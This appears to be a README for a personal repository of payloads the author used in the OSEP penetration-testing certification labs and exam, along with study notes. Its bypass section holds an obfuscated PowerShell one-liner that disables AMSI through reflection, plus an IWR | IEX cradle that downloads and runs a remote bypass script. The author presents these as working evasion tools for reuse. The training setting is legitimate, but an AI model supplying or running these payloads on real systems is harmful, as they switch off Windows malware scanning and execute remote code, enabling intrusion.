# OSEP-Stuff

This repo contains all the payloads I had used in the OSEP challenge labs as well as my first(and coming tomorrow second exam attempt). For backround, I got plunged into the course like a month ago, and since I was off semester break and have the oscp, crtp as well as a fairly deep knowledge of Active Directory exploitation and was able to dedicate time from 10/11 am until 2 am on the osep; I felt confident to take it on! I am happy to fail it but feel that considering the monster effort I put in as well as my previous knowledge that it should go hopefully well!

I skipped about half the course. Certain sections I didnt really pay attention to, such as DotNetToJS since I didnt see a need for it. Other sections I skipped through such as network evasion, kisok breakout, and some of the Active Directory stuff since I was intimately fimilar with it all. The most time I spent was building robust, and simple payloads. I didnt develop many(as you can see from this repo) but I will personally compensate your exam attempt if these payloads get caught out by AV : ). I just wrote the same code in different format, just connect to my smbshare on kali and execute a csproj file. 

Sheldons FullBypass.csproj covered by every need at any moment when I needed a powershell session without amsi or clm; all I had to do was execute it and I was golden. The newest things for me were Linux, SSH and MSSQL exploitation. I reccomend deeply engaging with labs 3 and 4 as those will cover these abundantly. 

##Antivirus Bypass

I only used two payloads if sheldons fullbypass.csproj didnt work or if I didnt need to bypass clm and so only needed to bypass amsi: 

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + (('b'+("{1}{0}"-f':1','lE'))+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f(('U'+'ti')+'l'),'A',('Am'+'si'),(('.'+'Man')+('ag'+'e')+('me'+'n')+'t.'),('u'+'to'+(("{1}{0}"-f 'io','mat')+'n.')),'s',(('Sys'+'t')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+('ms'+'i')),'d',('I'+('n'+'itF')+('a'+'ile'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+('t'+'at')),'i',(('N'+'on')+('Pu'+'bl')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
This payload I had gotten from the crtp course and what not. The next payload I used is in my amsi bypass folder. That one can simply be executed via 
```powershell
IWR -UseBasicParsing http://ip/sidestep.ps1 | IEX
```
You have two options; you either have no CLM and thus using the above script or one liner from the CRTP will instantly destroy amsi or you do have CLM, in which case you should use the FullBypass.csproj payload. It will work 70% of the time but sometimes AMSI is still present and so you will need to refer back to the one liner from above and keep running it till no more amsi. Simple, easy and clean. It really doesnt have to be all that complex and powershell reflection and all that to be able to quickly bypass amsi & clm
